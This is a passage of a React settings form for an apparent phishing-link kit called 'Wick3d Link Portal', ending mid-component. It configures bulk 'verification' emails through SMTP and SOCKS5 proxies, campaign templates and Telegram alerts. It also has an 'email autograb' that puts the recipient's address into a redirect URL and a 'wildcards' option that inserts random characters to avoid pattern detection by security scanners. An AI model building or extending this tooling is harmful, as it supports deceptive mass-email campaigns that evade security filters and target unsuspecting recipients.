import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import React, { useEffect, useMemo, useState } from "react";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Settings } from "@/lib/types";
import { Card, CardContent } from "@/components/ui/card";
import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Switch } from "@/components/ui/switch";
import { Button } from "@/components/ui/button";
import { Loader2, X } from "lucide-react";

const settingsSchema = z.object({
  redirectUrl: z.string().url("Please enter a valid URL"),
  showLoadingSpinner: z.boolean(),
  loadingDuration: z.number().int().min(1, "Duration must be at least 1 second").max(10, "Duration must be at most 10 seconds"),
  successMessage: z.string().min(1, "Success message cannot be empty"),
  useEmailAutograb: z.boolean(),
  emailAutograbParam: z.string().min(1, "Parameter name cannot be empty"),
  enableBotProtection: z.boolean(),
  customThankYouPage: z.string(),
  useCustomThankYouPage: z.boolean(),
  // Security settings
  securityLevel: z.number().int().min(1).max(5),
  useWildcards: z.boolean(),
  encryptionSalt: z.string(),
  allowLinkRenewal: z.boolean(),
  // Rate limiting settings
  enableRateLimiting: z.boolean(),
  rateLimitWindow: z.number().int().min(1, "Window must be at least 1 minute").max(60, "Window must be at most 60 minutes"),
  rateLimitMaxRequests: z.number().int().min(10, "Max requests must be at least 10").max(1000, "Max requests must be at most 1000"),
  rateLimitBlockDuration: z.number().int().min(5, "Block duration must be at least 5 minutes").max(1440, "Block duration must be at most 1440 minutes (24 hours)"),
  // Domain settings
  useCustomDomain: z.boolean(),
  customDomain: z.string().optional(),
  domainCnameTarget: z.string().optional(),
  domainVerified: z.boolean(),
  additionalDomains: z.string(),
  // Custom email template settings
  emailSubject: z.string().min(1, "Email subject cannot be empty"),
  emailTemplate: z.string().min(1, "Email template cannot be empty"),
  senderEmail: z.string().email("Please enter a valid email address"),
  senderName: z.string().min(1, "Sender name cannot be empty"),
  smtpServer: z.string().min(1, "SMTP server cannot be empty"),
  smtpPort: z.number().int().min(1, "Port must be at least 1").max(65535, "Port must be at most 65535"),
  smtpUser: z.string().optional(),
  smtpPassword: z.string().optional(),
  // SOCKS5 proxy settings
  useSocks5Proxy: z.boolean(),
  socks5Host: z.string().optional(),
  socks5Port: z.number().int().min(1, "Port must be at least 1").max(65535, "Port must be at most 65535"),
  socks5Username: z.string().optional(),
  socks5Password: z.string().optional(),
  socks5MaxAttempts: z.number().int().min(1).max(1000),
  // Saved email templates
  savedTemplates: z.string(),
  // Telegram notification settings
  useTelegramNotifications: z.boolean(),
  telegramBotToken: z.string().optional(),
  telegramChatId: z.string().optional(),
});

type SettingsFormValues = z.infer<typeof settingsSchema>;

export default function SettingsForm() {
  const { toast } = useToast();

  // Fetch current settings
  const { data: settings, isLoading, error } = useQuery<Settings>({
    queryKey: ["/api/settings"],
  });

  // Create form with default values
  const form = useForm<SettingsFormValues>({
    resolver: zodResolver(settingsSchema),
    defaultValues: {
      redirectUrl: "",
      showLoadingSpinner: true,
      loadingDuration: 3,
      successMessage: "Thank you for verifying your email address!",
      useEmailAutograb: false,
      emailAutograbParam: "email",
      enableBotProtection: true,
      customThankYouPage: "",
      useCustomThankYouPage: false,
      // Security settings
      securityLevel: 1,
      useWildcards: false,
      encryptionSalt: "default-salt-change-me",
      allowLinkRenewal: true,
      // Rate limiting settings
      enableRateLimiting: true,
      rateLimitWindow: 15,
      rateLimitMaxRequests: 100,
      rateLimitBlockDuration: 30,
      // Domain settings
      useCustomDomain: false,
      customDomain: "",
      domainCnameTarget: "",
      domainVerified: false,
      additionalDomains: "[]",
      // Email settings defaults
      emailSubject: "Please verify your email address",
      emailTemplate: "Hello,\n\nPlease click the link below to verify your email address:\n\n{link}\n\nThis link will expire in 7 days.\n\nThank you,\nWick3d Link Portal",
      senderEmail: "no-reply@wick3d-links.com",
      senderName: "Wick3d Link Portal",
      smtpServer: "localhost",
      smtpPort: 25,
      smtpUser: "",
      smtpPassword: "",
      // SOCKS5 proxy settings
      useSocks5Proxy: false,
      socks5Host: "",
      socks5Port: 1080,
      socks5Username: "",
      socks5Password: "",
      socks5MaxAttempts: 300,
      // Saved email templates
      savedTemplates: "[]",
      // Telegram notification settings
      useTelegramNotifications: false,
      telegramBotToken: "",
      telegramChatId: "",
    },
  });

  // Update form values when settings are loaded
  useEffect(() => {
    if (settings) {
      form.reset({
        redirectUrl: settings.redirectUrl,
        showLoadingSpinner: settings.showLoadingSpinner,
        loadingDuration: settings.loadingDuration,
        successMessage: settings.successMessage,
        useEmailAutograb: settings.useEmailAutograb,
        emailAutograbParam: settings.emailAutograbParam,
        enableBotProtection: settings.enableBotProtection,
        customThankYouPage: settings.customThankYouPage,
        useCustomThankYouPage: settings.useCustomThankYouPage,
        // Security settings
        securityLevel: settings.securityLevel,
        useWildcards: settings.useWildcards,
        encryptionSalt: settings.encryptionSalt,
        allowLinkRenewal: settings.allowLinkRenewal,
        // Rate limiting settings
        enableRateLimiting: settings.enableRateLimiting,
        rateLimitWindow: settings.rateLimitWindow,
        rateLimitMaxRequests: settings.rateLimitMaxRequests,
        rateLimitBlockDuration: settings.rateLimitBlockDuration,
        // Domain settings
        useCustomDomain: settings.useCustomDomain,
        customDomain: settings.customDomain || '',
        domainCnameTarget: settings.domainCnameTarget || '',
        domainVerified: settings.domainVerified,
        additionalDomains: settings.additionalDomains,
        // Email template settings
        emailSubject: settings.emailSubject,
        emailTemplate: settings.emailTemplate,
        senderEmail: settings.senderEmail,
        senderName: settings.senderName,
        smtpServer: settings.smtpServer,
        smtpPort: settings.smtpPort,
        smtpUser: settings.smtpUser || '',
        smtpPassword: settings.smtpPassword || '',
        // SOCKS5 proxy settings
        useSocks5Proxy: settings.useSocks5Proxy,
        socks5Host: settings.socks5Host || '',
        socks5Port: settings.socks5Port,
        socks5Username: settings.socks5Username || '',
        socks5Password: settings.socks5Password || '',
        socks5MaxAttempts: settings.socks5MaxAttempts,
        // Saved email templates
        savedTemplates: settings.savedTemplates,
        // Telegram notification settings
        useTelegramNotifications: settings.useTelegramNotifications,
        telegramBotToken: settings.telegramBotToken || '',
        telegramChatId: settings.telegramChatId || '',
      });
    }
  }, [settings, form]);

  // Update settings mutation
  const updateMutation = useMutation({
    mutationFn: async (data: SettingsFormValues) => {
      const res = await apiRequest("POST", "/api/settings", data);
      return res.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/settings"] });
      toast({
        title: "Settings saved",
        description: "Your settings have been updated successfully.",
      });
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to save settings",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: SettingsFormValues) => {
    updateMutation.mutate(data);
  };

  if (isLoading) {
    return (
      <Card>
        <CardContent className="pt-6 text-center">
          <Loader2 className="h-8 w-8 animate-spin mx-auto" />
          <p className="mt-2 text-sm text-gray-500">Loading settings...</p>
        </CardContent>
      </Card>
    );
  }

  if (error) {
    return (
      <Card>
        <CardContent className="pt-6 text-center">
          <p className="text-red-500">Error loading settings</p>
          <p className="mt-2 text-sm text-gray-500">
            {error instanceof Error ? error.message : "Unknown error"}
          </p>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardContent className="pt-6 pb-6">
        <div className="border-b border-gray-200 pb-4 mb-6">
          <h2 className="text-lg font-medium text-gray-900">Verification Settings</h2>
          <p className="mt-1 text-sm text-gray-500">
            Configure settings for the verification process.
          </p>
        </div>
        
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
            <FormField
              control={form.control}
              name="redirectUrl"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Redirect URL After Verification</FormLabel>
                  <FormControl>
                    <Input placeholder="https://example.com/thank-you" {...field} />
                  </FormControl>
                  <FormDescription>
                    Users will be redirected to this URL after successful verification.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="showLoadingSpinner"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Enable Loading Spinner</FormLabel>
                    <FormDescription>
                      Show a loading spinner during verification before redirecting.
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="loadingDuration"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Loading Spinner Duration (seconds)</FormLabel>
                  <FormControl>
                    <Input
                      type="number"
                      min={1}
                      max={10}
                      {...field}
                      onChange={(e) => field.onChange(parseInt(e.target.value) || 3)}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="successMessage"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Verification Success Message</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder="Thank you for verifying your email address!"
                      className="min-h-[80px]"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Advanced Features</h3>
            </div>
            
            <FormField
              control={form.control}
              name="useEmailAutograb"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Enable Email Autograb</FormLabel>
                    <FormDescription>
                      Replace a parameter in the redirect URL with the user's email address
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('useEmailAutograb') && (
              <FormField
                control={form.control}
                name="emailAutograbParam"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Email Parameter Name</FormLabel>
                    <FormControl>
                      <Input placeholder="email" {...field} />
                    </FormControl>
                    <FormDescription>
                      Example: If parameter is "email", your redirect URL like "https://example.com?email=EMAIL_HERE" 
                      will replace EMAIL_HERE with the user's actual email
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}
            
            <FormField
              control={form.control}
              name="enableBotProtection"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Enable Bot Protection</FormLabel>
                    <FormDescription>
                      Show a simple challenge for verification links when suspicious traffic is detected
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="useCustomThankYouPage"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Use Custom Thank You Page</FormLabel>
                    <FormDescription>
                      Use custom HTML for the verification success page instead of the default
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('useCustomThankYouPage') && (
              <FormField
                control={form.control}
                name="customThankYouPage"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Custom Thank You HTML</FormLabel>
                    <FormControl>
                      <Textarea
                        placeholder="<h1>Thank you!</h1><p>Your email has been verified.</p>"
                        className="min-h-[200px] font-mono"
                        {...field}
                      />
                    </FormControl>
                    <FormDescription>
                      Enter custom HTML for the thank you page. Use &#123;email&#125; to include the user's email.
                    </FormDescription>
                    <FormMessage />
                  </FormItem>
                )}
              />
            )}

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Domain Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Configure custom domain for verification links.
              </p>
            </div>
            
            <FormField
              control={form.control}
              name="useCustomDomain"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Use Custom Domain</FormLabel>
                    <FormDescription>
                      Use a custom domain for verification links instead of the default
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('useCustomDomain') && (
              <>
                <FormField
                  control={form.control}
                  name="customDomain"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Custom Domain</FormLabel>
                      <FormControl>
                        <Input placeholder="verify.yourdomain.com" {...field} />
                      </FormControl>
                      <FormDescription>
                        Enter your custom domain without http:// or https://
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="domainCnameTarget"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>CNAME Record</FormLabel>
                      <FormControl>
                        <div className="flex items-center space-x-2">
                          <Input
                            readOnly
                            value={field.value || "wick3d-links.replit.app"}
                            className="bg-gray-50"
                          />
                          <Button
                            type="button"
                            variant="outline"
                            onClick={() => {
                              navigator.clipboard.writeText(field.value || "wick3d-links.replit.app");
                              toast({
                                title: "CNAME copied",
                                description: "CNAME target copied to clipboard",
                              });
                            }}
                          >
                            Copy
                          </Button>
                        </div>
                      </FormControl>
                      <FormDescription>
                        Create a CNAME record for your domain pointing to this value
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                
                <FormField
                  control={form.control}
                  name="domainVerified"
                  render={({ field }) => (
                    <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                      <div className="space-y-0.5">
                        <FormLabel className="text-base">Domain Verification Status</FormLabel>
                        <FormDescription>
                          {field.value ? "Domain has been verified" : "Domain verification pending"}
                        </FormDescription>
                      </div>
                      <div className={`px-3 py-1 rounded-full text-xs font-medium ${field.value ? "bg-green-100 text-green-800" : "bg-yellow-100 text-yellow-800"}`}>
                        {field.value ? "Verified" : "Pending"}
                      </div>
                    </FormItem>
                  )}
                />
                
                <div className="flex flex-col">
                  <Button
                    type="button"
                    variant="outline"
                    className="self-start"
                    disabled={updateMutation.isPending}
                    onClick={async () => {
                      const domain = form.getValues('customDomain');
                      if (!domain) {
                        toast({
                          title: "Error",
                          description: "Please enter a custom domain first",
                          variant: "destructive",
                        });
                        return;
                      }
                      
                      try {
                        const res = await apiRequest("POST", "/api/domain/verify", { domain });
                        const data = await res.json();
                        
                        if (data.success) {
                          // Update form values with the response
                          if (data.settings) {
                            form.setValue('domainVerified', data.settings.domainVerified);
                            form.setValue('domainCnameTarget', data.settings.domainCnameTarget);
                          }
                          
                          toast({
                            title: "Domain verified",
                            description: "Your domain has been successfully verified. Use the provided CNAME record to point your domain.",
                          });
                          
                          // Refresh settings data
                          queryClient.invalidateQueries({ queryKey: ["/api/settings"] });
                        } else {
                          toast({
                            title: "Verification failed",
                            description: data.message || "Unable to verify domain",
                            variant: "destructive",
                          });
                        }
                      } catch (error) {
                        toast({
                          title: "Verification error",
                          description: error instanceof Error ? error.message : "Failed to verify domain",
                          variant: "destructive",
                        });
                      }
                    }}
                  >
                    {updateMutation.isPending ? (
                      <>
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      "Verify Domain"
                    )}
                  </Button>
                </div>

                {/* Additional Domains Section */}
                <div className="mt-6 border-t border-gray-200 pt-6">
                  <h4 className="text-sm font-medium text-gray-900 mb-4">Additional Domains</h4>
                  <p className="mt-1 text-sm text-gray-500 mb-4">
                    Configure multiple domains to use for verification links
                  </p>
                  
                  <FormField
                    control={form.control}
                    name="additionalDomains"
                    render={({ field }) => {
                      // Parse the JSON string to an array with error handling
                      let domainsArray = [];
                      try {
                        domainsArray = field.value ? JSON.parse(field.value) : [];
                        // Ensure it's an array
                        if (!Array.isArray(domainsArray)) {
                          console.error("additionalDomains is not an array, resetting to empty array");
                          domainsArray = [];
                        }
                      } catch (error) {
                        console.error("Error parsing additionalDomains JSON:", error);
                        domainsArray = [];
                      }
                      
                      // Local state for new domain input
                      const [newDomain, setNewDomain] = useState("");
                      const [isAddingDomain, setIsAddingDomain] = useState(false);
                      const [isRemovingDomain, setIsRemovingDomain] = useState<string | null>(null);
                      
                      // Function to add a new domain using API
                      const addDomain = async () => {
                        if (!newDomain) return;
                        
                        // Check if domain already exists in local array first
                        const domainExists = domainsArray.some((domain: any) => 
                          (typeof domain === 'string' && domain === newDomain) || 
                          (typeof domain === 'object' && domain.domain === newDomain)
                        );
                        
                        if (domainExists) {
                          toast({
                            title: "Domain already exists",
                            description: "This domain is already in your list.",
                            variant: "destructive",
                          });
                          return;
                        }
                        
                        // Use the domain management API
                        try {
                          setIsAddingDomain(true);
                          const response = await apiRequest("POST", "/api/domain/manage", {
                            action: "add",
                            domain: newDomain
                          });
                          
                          const data = await response.json();
                          
                          if (data.success) {
                            // Update the form value with the new domains from the API
                            field.onChange(JSON.stringify(data.domains));
                            setNewDomain("");
                            toast({
                              title: "Domain added",
                              description: "Your domain has been added successfully.",
                            });
                          } else {
                            toast({
                              title: "Failed to add domain",
                              description: data.message || "An error occurred while adding the domain.",
                              variant: "destructive",
                            });
                          }
                        } catch (error) {
                          toast({
                            title: "Error adding domain",
                            description: error instanceof Error ? error.message : "An unknown error occurred",
                            variant: "destructive",
                          });
                        } finally {
                          setIsAddingDomain(false);
                        }
                      };
                      
                      // Function to remove a domain using API
                      const removeDomain = async (domainToRemove: string) => {
                        try {
                          setIsRemovingDomain(domainToRemove);
                          const response = await apiRequest("POST", "/api/domain/manage", {
                            action: "remove",
                            domain: domainToRemove
                          });
                          
                          const data = await response.json();
                          
                          if (data.success) {
                            // Update the form value with the new domains from the API
                            field.onChange(JSON.stringify(data.domains));
                            toast({
                              title: "Domain removed",
                              description: "Your domain has been removed successfully.",
                            });
                          } else {
                            toast({
                              title: "Failed to remove domain",
                              description: data.message || "An error occurred while removing the domain.",
                              variant: "destructive",
                            });
                          }
                        } catch (error) {
                          toast({
                            title: "Error removing domain",
                            description: error instanceof Error ? error.message : "An unknown error occurred",
                            variant: "destructive",
                          });
                        } finally {
                          setIsRemovingDomain(null);
                        }
                      };
                      
                      return (
                        <FormItem>
                          <div className="flex items-end space-x-2 mb-4">
                            <div className="flex-1">
                              <FormLabel>Add Domain</FormLabel>
                              <Input 
                                value={newDomain} 
                                onChange={(e) => setNewDomain(e.target.value)}
                                placeholder="verify2.yourdomain.com" 
                              />
                            </div>
                            <Button 
                              type="button" 
                              onClick={addDomain}
                              disabled={!newDomain}
                            >
                              Add
                            </Button>
                          </div>
                          
                          <div className="space-y-2">
                            {domainsArray.length > 0 ? (
                              <div className="border rounded-md">
                                <ul className="divide-y">
                                  {domainsArray.map((domain: any, index: number) => {
                                    // Handle both string and object formats
                                    const domainValue = typeof domain === 'string' ? domain : domain.domain;
                                    const isVerified = typeof domain === 'object' && domain.verified;
                                    
                                    return (
                                      <li key={index} className="flex items-center justify-between p-3">
                                        <div className="flex items-center space-x-2">
                                          <span className="text-sm">{domainValue}</span>
                                          {typeof domain === 'object' && (
                                            <div className={`px-2 py-0.5 rounded-full text-xs ${isVerified ? 'bg-green-100 text-green-800' : 'bg-yellow-100 text-yellow-800'}`}>
                                              {isVerified ? 'Verified' : 'Pending'}
                                            </div>
                                          )}
                                        </div>
                                        <Button
                                          type="button"
                                          variant="ghost"
                                          size="sm"
                                          onClick={() => removeDomain(domainValue)}
                                        >
                                          <X className="h-4 w-4" />
                                        </Button>
                                      </li>
                                    );
                                  })}
                                </ul>
                              </div>
                            ) : (
                              <p className="text-sm text-gray-500">No additional domains added</p>
                            )}
                          </div>
                          <FormDescription>
                            Add multiple domains to use for verification links. Each domain must be configured with the same CNAME record.
                          </FormDescription>
                          <FormMessage />
                        </FormItem>
                      );
                    }}
                  />
                </div>
              </>
            )}

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Security Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Configure security options for verification links.
              </p>
            </div>

            <FormField
              control={form.control}
              name="securityLevel"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Security Level (1-5)</FormLabel>
                  <FormControl>
                    <Input
                      type="number"
                      min={1}
                      max={5}
                      {...field}
                      onChange={(e) => field.onChange(parseInt(e.target.value) || 1)}
                    />
                  </FormControl>
                  <FormDescription>
                    Higher levels provide stronger security but slower generation.
                  </FormDescription>
                  <div className="mt-2">
                    <ul className="list-disc pl-5 space-y-1 text-sm text-gray-500">
                      <li>Level 1: Basic random hexadecimal string (fastest)</li>
                      <li>Level 2: Basic + timestamp-based component</li>
                      <li>Level 3: Level 2 + domain-specific signature</li>
                      <li>Level 4: Level 3 + HMAC-based encryption</li>
                      <li>Level 5: Level 4 + Double-layered encryption (slowest)</li>
                    </ul>
                  </div>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="useWildcards"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Add Wildcards to Links</FormLabel>
                    <FormDescription>
                      Insert random special characters to avoid pattern detection by security scanners
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="encryptionSalt"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Encryption Salt</FormLabel>
                  <FormControl>
                    <Input
                      placeholder="default-salt-change-me"
                      {...field}
                    />
                  </FormControl>
                  <FormDescription>
                    Used for HMAC-based encryption in security levels 4 and 5.
                  </FormDescription>
                  <FormMessage />
                </FormItem>
              )}
            />
            
            <FormField
              control={form.control}
              name="allowLinkRenewal"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Allow Link Renewal</FormLabel>
                    <FormDescription>
                      Allow users to request new links when using expired or already verified links
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Rate Limiting Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Configure rate limiting to protect against abuse and bot traffic.
              </p>
            </div>

            <FormField
              control={form.control}
              name="enableRateLimiting"
              render={({ field }) => (
                <FormItem className="flex flex-row items-center justify-between rounded-lg border p-4">
                  <div className="space-y-0.5">
                    <FormLabel className="text-base">Enable Rate Limiting</FormLabel>
                    <FormDescription>
                      Limit the number of requests from a single IP address to prevent abuse
                    </FormDescription>
                  </div>
                  <FormControl>
                    <Switch
                      checked={field.value}
                      onCheckedChange={field.onChange}
                    />
                  </FormControl>
                </FormItem>
              )}
            />

            {form.watch('enableRateLimiting') && (
              <>
                <FormField
                  control={form.control}
                  name="rateLimitWindow"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Rate Limit Window (minutes)</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min={1}
                          max={60}
                          {...field}
                          onChange={(e) => field.onChange(parseInt(e.target.value) || 15)}
                        />
                      </FormControl>
                      <FormDescription>
                        Time window for rate limiting (1-60 minutes)
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="rateLimitMaxRequests"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Maximum Requests per Window</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min={10}
                          max={1000}
                          {...field}
                          onChange={(e) => field.onChange(parseInt(e.target.value) || 100)}
                        />
                      </FormControl>
                      <FormDescription>
                        Maximum number of requests allowed in the time window (10-1000)
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="rateLimitBlockDuration"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel>Block Duration (minutes)</FormLabel>
                      <FormControl>
                        <Input
                          type="number"
                          min={5}
                          max={1440}
                          {...field}
                          onChange={(e) => field.onChange(parseInt(e.target.value) || 30)}
                        />
                      </FormControl>
                      <FormDescription>
                        How long to block IPs after they exceed the limit (5-1440 minutes)
                      </FormDescription>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </>
            )}

            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Saved Email Templates</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Save and reuse your email templates for different campaigns.
              </p>
            </div>

            <FormField
              control={form.control}
              name="savedTemplates"
              render={({ field }) => {
                // Parse saved templates from JSON string
                const templates = useMemo(() => {
                  try {
                    return JSON.parse(field.value || '[]');
                  } catch (error) {
                    console.error("Error parsing saved templates:", error);
                    return [];
                  }
                }, [field.value]);

                // Function to save current template
                const saveCurrentTemplate = () => {
                  const name = window.prompt("Enter a name for this template:");
                  if (!name) return;
                  
                  const newTemplate = {
                    id: Date.now().toString(),
                    name,
                    subject: form.getValues("emailSubject"),
                    content: form.getValues("emailTemplate")
                  };
                  
                  const updatedTemplates = [...templates, newTemplate];
                  field.onChange(JSON.stringify(updatedTemplates));
                };

                // Function to load a template
                const loadTemplate = (template: { subject: string; content: string }) => {
                  form.setValue("emailSubject", template.subject);
                  form.setValue("emailTemplate", template.content);
                };

                // Function to delete a template
                const deleteTemplate = (id: string) => {
                  const updatedTemplates = templates.filter((t: { id: string }) => t.id !== id);
                  field.onChange(JSON.stringify(updatedTemplates));
                };

                return (
                  <FormItem>
                    <div className="flex justify-between items-center mb-4">
                      <FormLabel className="text-base">Template Library</FormLabel>
                      <Button 
                        type="button" 
                        variant="outline" 
                        size="sm"
                        onClick={saveCurrentTemplate}
                      >
                        Save Current Template
                      </Button>
                    </div>
                    
                    {templates.length === 0 ? (
                      <div className="text-center p-6 border border-dashed rounded-md">
                        <p className="text-sm text-gray-500">No saved templates yet. Save your current template to add it to your library.</p>
                      </div>
                    ) : (
                      <div className="grid grid-cols-1 gap-3">
                        {templates.map((template: { id: string; name: string; subject: string; content: string }) => (
                          <div key={template.id} className="flex justify-between items-center p-3 border rounded-md hover:bg-gray-50">
                            <div>
                              <p className="font-medium">{template.name}</p>
                              <p className="text-sm text-gray-500 truncate max-w-[400px]">{template.subject}</p>
                            </div>
                            <div className="flex space-x-2">
                              <Button
                                type="button"
                                variant="outline"
                                size="sm"
                                onClick={() => loadTemplate(template)}
                              >
                                Load
                              </Button>
                              <Button
                                type="button"
                                variant="outline"
                                size="sm"
                                onClick={() => deleteTemplate(template.id)}
                              >
                                Delete
                              </Button>
                            </div>
                          </div>
                        ))}
                      </div>
                    )}
                    <FormMessage />
                  </FormItem>
                );
              }}
            />
            
            <div className="border-t border-gray-200 pt-6 mt-6 mb-6">
              <h3 className="text-base font-medium text-gray-900 mb-4">Email Template Settings</h3>
              <p className="mt-1 text-sm text-gray-500 mb-4">
                Configure email templates for verification emails. Use {'{link}'} in your template to include the verification link.
              </p>
            </div>

            <FormField
              control={form.control}
              name="emailSubject"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email Subject</FormLabel>
                  <FormControl>
                    <Input placeholder="Please verify your email address" {...field} />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="emailTemplate"
              render={({ field }) => (
                <FormItem>
                  <FormLabel>Email Template (HTML)</FormLabel>
                  <FormControl>
                    <Textarea
                      placeholder={`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify Your Email</title>
  <style>
    body { 
      font-family: Arial, sans-serif;
      line-height: 1.6;
      color: #333;
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
    }
    .container {
      border: 1px solid #ddd;
      border-radius: 5px;
      padding: 20px;
      background-color: #f9f9f9;
    }
    .header {
      text-align: center;
      margin-bottom: 20px;
    }
    .logo {
      font-size: 24px;
      font-weight: bold;
      background: linear-gradient(45deg, #ff6b6b, #6b47ff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: inline-block;
    }
    .button {
      display: inline-block;
      padding: 10px 20px;
      background: linear-gradient(45deg, #ff6b6b, #6b47ff);
      color: white !important;
      text-decoration: none;
      border-radius: 5px;
      font-weight: bold;
      margin: 20px 0;
    }
    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #777;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="logo">Wick3d Link Portal</div>
    </div>
    <p>Hello,</p>
    <p>Thank you for using our service. Please click the button below to verify your email address:</p>
    <div style="text-align: center;">
      <a href="{link}" class="button">Verify Email Address</a>
    </div>
    <p>If the button doesn't work, you can also click on the link below:</p>
    <p><a href="{link}">{link}</a></p>
    <p>This link will expire in 7 days.</p>
    <p>Thank you,<br>The Wick3d Link Portal Team</p>
    <div class="footer">
      <p>© 2025 Wick3d Link Portal. All rights reserved.</p>
      <p>If you didn't request this email, please ignore it.</p>
    </div>
  </div>
</body>
</html>`}
                      className="min-h-[400px] font-mono text-sm"
                      {...field}
                    />
                  </FormControl>
                  <FormDescription>
                    Use HTML to create a professional, branded email template.
                  </FormDescription>
                  <div className="mt-2 space-y-2 text-sm text-gray-500">
                    <div>Available placeholders:</div>
